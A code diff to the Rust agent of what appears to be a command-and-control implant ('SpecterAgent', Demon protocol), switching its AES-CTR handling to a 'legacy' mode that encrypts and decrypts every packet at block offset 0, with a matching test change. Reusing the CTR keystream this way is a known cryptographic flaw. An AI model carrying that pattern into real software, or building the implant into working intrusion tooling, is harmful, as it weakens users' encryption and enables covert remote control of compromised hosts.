@@ -10,8 +10,7 @@ use tracing::{info, warn};
 use crate::config::SpecterConfig;
 use crate::error::SpecterError;
 use crate::protocol::{
-    AgentMetadata, build_callback_packet, build_init_packet, ctr_blocks_for_len, parse_init_ack,
-    parse_tasking_response,
+    AgentMetadata, build_callback_packet, build_init_packet, parse_init_ack, parse_tasking_response,
 };
 use crate::transport::HttpTransport;
 
@@ -101,9 +100,8 @@ impl SpecterAgent {
         info!(agent_id = format_args!("0x{:08X}", self.agent_id), "sending DEMON_INIT");
 
         let response = self.transport.send(&packet).await?;
-        let ack_blocks = parse_init_ack(&response, self.agent_id, &self.session_crypto)?;
-
-        self.sync_ctr_offsets(ack_blocks);
+        // Validate the ACK; legacy CTR mode means offset stays at 0.
+        parse_init_ack(&response, self.agent_id, &self.session_crypto)?;
 
         info!(
             agent_id = format_args!("0x{:08X}", self.agent_id),
@@ -209,7 +207,8 @@ impl SpecterAgent {
             payload,
         )?;
         let response = self.transport.send(&packet).await?;
-        self.sync_ctr_offsets(self.send_ctr_offset + ctr_blocks_for_len(4 + payload.len()));
+        // Legacy CTR mode: server resets AES-CTR to block 0 for every packet,
+        // so our offset must also remain 0 after each send.
         Ok(response)
     }
 
@@ -219,24 +218,22 @@ impl SpecterAgent {
         }
 
         let message = DemonMessage::from_bytes(response)?;
-        let mut next_recv_ctr_offset = self.recv_ctr_offset;
         let mut packages = Vec::with_capacity(message.packages.len());
 
         for mut package in message.packages {
             if !package.payload.is_empty() {
-                let encrypted_len = package.payload.len();
+                // Legacy CTR mode: server encrypts each job payload independently at
+                // block offset 0.  Decrypt each package at offset 0 to match.
                 package.payload = decrypt_agent_data_at_offset(
                     &self.session_crypto.key,
                     &self.session_crypto.iv,
-                    next_recv_ctr_offset,
+                    0,
                     &package.payload,
                 )?;
-                next_recv_ctr_offset += ctr_blocks_for_len(encrypted_len);
             }
             packages.push(package);
         }
 
-        self.sync_ctr_offsets(next_recv_ctr_offset);
         Ok(DemonMessage::new(packages))
     }
 
@@ -403,24 +400,24 @@ mod tests {
     }
 
     #[test]
-    fn decrypt_job_message_decrypts_payloads_and_advances_recv_ctr() {
+    fn decrypt_job_message_decrypts_payloads_with_legacy_ctr() {
         let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
-        agent.sync_ctr_offsets(3);
+        // Legacy CTR: offset is always 0; server encrypts each payload independently
+        // at block offset 0, so the agent must also decrypt each at offset 0.
 
         let first_plaintext = vec![0xAA, 0xBB, 0xCC];
         let second_plaintext = vec![0x10; 17];
         let first_payload = red_cell_common::crypto::encrypt_agent_data_at_offset(
             &agent.session_crypto.key,
             &agent.session_crypto.iv,
-            agent.recv_ctr_offset,
+            0,
             &first_plaintext,
         )
         .expect("encrypt first payload");
-        let second_offset = agent.recv_ctr_offset + ctr_blocks_for_len(first_plaintext.len());
         let second_payload = red_cell_common::crypto::encrypt_agent_data_at_offset(
             &agent.session_crypto.key,
             &agent.session_crypto.iv,
-            second_offset,
+            0,
             &second_plaintext,
         )
         .expect("encrypt second payload");
@@ -439,7 +436,8 @@ mod tests {
         assert_eq!(message.packages[0].payload, first_plaintext);
         assert!(message.packages[1].payload.is_empty());
         assert_eq!(message.packages[2].payload, second_plaintext);
-        assert_eq!(agent.recv_ctr_offset(), 3 + ctr_blocks_for_len(3) + ctr_blocks_for_len(17));
-        assert_eq!(agent.send_ctr_offset(), agent.recv_ctr_offset());
+        // Legacy CTR: offsets remain 0 (server always uses block offset 0 per packet).
+        assert_eq!(agent.recv_ctr_offset(), 0);
+        assert_eq!(agent.send_ctr_offset(), 0);
     }
 }
